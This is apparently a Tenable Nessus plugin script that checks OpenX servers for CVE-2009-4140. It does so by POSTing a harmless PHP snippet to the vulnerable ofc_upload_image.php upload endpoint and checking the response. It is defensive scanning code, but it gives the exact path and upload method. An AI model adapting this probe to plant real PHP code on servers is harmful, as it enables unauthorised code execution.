#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(49271);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2017/01/30 15:10:03 $");

  script_cve_id("CVE-2009-4140");
  script_bugtraq_id(37314);
  script_osvdb_id(59051);

  script_name(english:"OpenX Open Flash Chart ofc_upload_image.php File Upload Arbitrary Code Execution");
  script_summary(english:"Tries to upload an invalid file through OpenX's OFC plugin");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A PHP application hosted on the remote web server allows uploading
arbitrary files."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The third-party Open Flash Chart component included with the version
of OpenX hosted on the remote web server allows an unauthenticated
attacker to upload arbitrary files to the affected system, by default
in a web-accessible directory.

While Nessus has not verified this, it is likely that an attacker
could exploit this to upload a script with, say, PHP code and then
browse to that file, causing arbitrary code to be executed on the
remote system subject to the privileges of the web server user id."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e959029c");
  script_set_attribute(
    attribute:"see_also",
    value:"http://blog.sucuri.net/2010/09/openx-users-time-to-upgrade.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://blog.openx.org/09/security-update/"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"Either remove the 'ofc_upload_image.php' script in
'admin/plugins/videoReport/lib/ofc2' or upgrade to version 2.8.7 or
later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"OpenX 2.8.6 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Open Flash Chart v2 Arbitrary File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

script_set_attribute(attribute:"vuln_publication_date", value:"2009/10/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("openx_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/openx");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");



port = get_http_port(default:80, php:TRUE);


install = get_install_from_kb(appname:'openx', port:port, exit_on_fail:TRUE);
dir = install['dir'];
url = dir + '/www/admin/plugins/videoReport/lib/ofc2/ofc_upload_image.php';


# Make sure the page exists before trying to POST to it.
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (!res[2] || "Saving your image to:" >!< res[2])
  exit(0, 'The OpenX install at '+build_url(port:port, qs:url)+' is not affected.');


# Try to exploit it.
#
# select one:
name = "";                             # will display an error message.
# name = SCRIPT_NAME+'-'+unixtime();     # will actually write to a file.

postdata =
  '<?php\n' +
  '\n' +
  'echo "'+SCRIPT_NAME+'\\n";\n' +
  '# phpinfo();\n' +
  '\n' +
  '?>';

res = http_send_recv3(
  port         : port,
  method       : 'POST',
  item         : url + '?name='+name,
  data         : postdata,
  content_type : 'text/plain',
  exit_on_fail : TRUE
);


# There's a problem if we see our "name" in the output.
if (
  res[2] &&
  egrep(pattern:'^Saving your image to:.+/'+name, string:res[2])
)
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
      '\n' + http_last_sent_request() +
      '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);

  exit(0);
}
else exit(0, 'The OpenX install at '+build_url(port:port, qs:url)+' is not affected.');
